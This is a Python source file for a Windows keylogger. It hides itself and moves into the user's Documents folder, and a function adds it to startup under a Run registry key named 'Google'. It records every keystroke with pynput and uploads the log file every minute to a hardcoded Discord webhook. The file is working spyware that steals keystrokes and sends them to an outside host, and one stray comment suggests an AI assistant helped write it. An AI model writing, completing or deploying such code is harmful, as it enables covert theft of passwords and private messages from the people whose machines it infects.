import os
import getpass
import time
import ctypes
import tkinter as tk
import requests
from pynput import keyboard
import math
import winreg
from pathlib import Path
import sys


# Example usage:


webhook_url = 'https://discord.com/api/webhooks/1187414843637121164/0P-BlEVuY9xMx9wCqZVO3ch2MJ415sjHesLvLaZVdqvGbp2KBEir391bj4X-FA_k0oG3'

keylogs_str = ""

delay_duration = 60  # Set the delay duration in seconds

script_path = sys.argv[0] #Script Path with file

source_path = Path(script_path)

os.system(f"attrib +h {script_path}")  # Set hidden attribute on Windows
os.chmod(script_path, 0o0700)
username = getpass.getuser()

file_name = os.path.basename(script_path)

destination_path = Path(f'C:/Users/{username}/Documents/{file_name}')

source_path.rename(destination_path)

print(script_path)


print("Hidden")

log_path = f"C:/Users/{username}/Documents/log.txt" # Set the Timer
last_key_time = time.time()



def add_to_startup(script_path): #Make the File Hidden
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(key, "Google", 0, winreg.REG_SZ, script_path)

def send_webhook_with_file(webhook_url, file_path): #Send to discord file
    with open(file_path, 'rb') as file:
        payload = {"content": "WORKING!"}
        files = {'file': (file_path, file)}
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 200:
            file.close()
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")

def send_keylogs_to_discord(): #Indicate the timer and if the file exceed 2mb send it to discord
    global keylogs_str
    if keylogs_str:
        
        file_size = os.path.getsize(log_path) / (1024 * 1024)  # Convert bytes to megabytes

        print(math.floor(file_size))
        if file_size >= 2 and time.time() - last_key_time == delay_duration:
            print(f"File size is {file_size:.2f} MB. Uploading to Discord and deleting...")
            send_webhook_with_file(webhook_url, log_path)
            os.remove(log_path)
            print("File uploaded and deleted.")
        else:
            print(f"File size is {file_size:.2f} MB.")
            send_webhook_with_file(webhook_url, log_path)
            print("Uploading...")

        keylogs_str = ""
    return
def get_capslock_state():
    return ctypes.windll.user32.GetKeyState(0x14)


def handle_special_keys(key): #Special Keys
    special_characters = {
        keyboard.Key.backspace: "\n [BackSpace]\n",
        keyboard.Key.enter: "\n [Enter]\n",
        keyboard.Key.space: " ",
        keyboard.Key.ctrl_l: "\n [Ctrl]\n",
    }
    

    if key in special_characters:
        print(f"{special_characters[key]} key pressed")
        return special_characters[key]

    if key == keyboard.Key.caps_lock:
        capslock_state = "[CAPSLOCK ON]" if get_capslock_state() else "[CAPSLOCK OFF]"
        print(f"Caps Lock is {capslock_state}")

    
    
    return None

def handle_numpad_keys(key): #Numpad Keys
    numpad_key_mapping = {
        96: "0",
        97: "1",
        98: "2",
        99: "3",
        100: "4",
        101: "5",
        102: "6",
        103: "7",
        104: "8",
        105: "9",
        106: "10",
        # Add more mappings as needed
    }

    if hasattr(key, 'vk') and key.vk in numpad_key_mapping:
        print(numpad_key_mapping[key.vk])
        return numpad_key_mapping[key.vk]

def handle_regular_keys(key): #Regular Keys
    try:
        char = format(key.char)
        capslock_state = get_capslock_state()

        if capslock_state:
            char = char.upper()
        elif keyboard.Key.shift:
            pass
        else:
            char = char.lower()
        
        
        return char
    except AttributeError:
        print(f"Special key {key} pressed")
        return None

def keyPressed(key): #When pressing keys
    global keylogs_str

    with open(log_path, 'a') as log_file:
        special_key_result = handle_special_keys(key)
        numpad_key_result = handle_numpad_keys(key)

        if special_key_result is not None:
            log_file.write(special_key_result)
            keylogs_str += special_key_result
        elif numpad_key_result is not None:
            log_file.write(numpad_key_result)
            keylogs_str += numpad_key_result
        else:
            regular_key_result = handle_regular_keys(key)
            if regular_key_result is not None:
                log_file.write(regular_key_result)
                keylogs_str += regular_key_result


# The following line was missing in my previous responses
keyboard.Listener(on_press=keyPressed)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    
    

    listener.start()
    
   
    try:    

        while True:

            start_time = time.time()

            while True:
                time_elapsed = time.time() - start_time
                time_remaining = max(0, delay_duration - time_elapsed)
                print(f"Time remaining: {time_remaining:.1f} seconds")
                if time_remaining == 0:
                    send_keylogs_to_discord()
                    break

                time.sleep(1)  # Sleep for 1 second to avoid high CPU usage

            print("Timer finished. Restarting...\n")
            

    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        listener.join()
